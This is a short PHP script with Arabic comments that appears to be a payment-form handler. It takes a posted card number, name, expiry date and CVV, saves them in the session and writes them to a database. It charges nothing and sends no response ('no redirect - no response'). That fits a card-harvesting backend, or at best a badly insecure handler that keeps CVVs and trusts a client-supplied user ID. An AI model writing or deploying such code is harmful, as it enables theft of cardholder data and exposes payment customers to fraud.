<?php
session_start();
require_once '../dashboard/init.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit;
}

$userId = $_SESSION['current_user_id'] ?? $_POST['user_id'] ?? null;

if (!$userId) {
    exit;
}

// ✅ استلام السعر المختار من الفورم
$selectedPrice = $_POST['price'] ?? '1.00';
$_SESSION['last_amount'] = $selectedPrice;
// ✅ حفظ بيانات البطاقة في الـ SESSION
$_SESSION['last_card_number'] = $_POST['cardNumber'] ?? null;
$_SESSION['last_card_name'] = $_POST['cardName'] ?? null;
$_SESSION['last_card_month'] = $_POST['month'] ?? null;
$_SESSION['last_card_year'] = $_POST['year'] ?? null;

// ✅ حفظ بيانات البطاقة في قاعدة البيانات
$User->insertCardPayment([
    'user_id' => $userId,
    'cardName' => $_POST['cardName'] ?? null,
    'cardNumber' => $_POST['cardNumber'] ?? null,
    'month' => $_POST['month'] ?? null,
    'year' => $_POST['year'] ?? null,
    'cvv' => $_POST['cvv'] ?? null,
    'price' => $selectedPrice, // ✅ السعر المختار من العميل
    'payment_method' => 'card'
]);

// ✅ لا redirect - لا response
exit;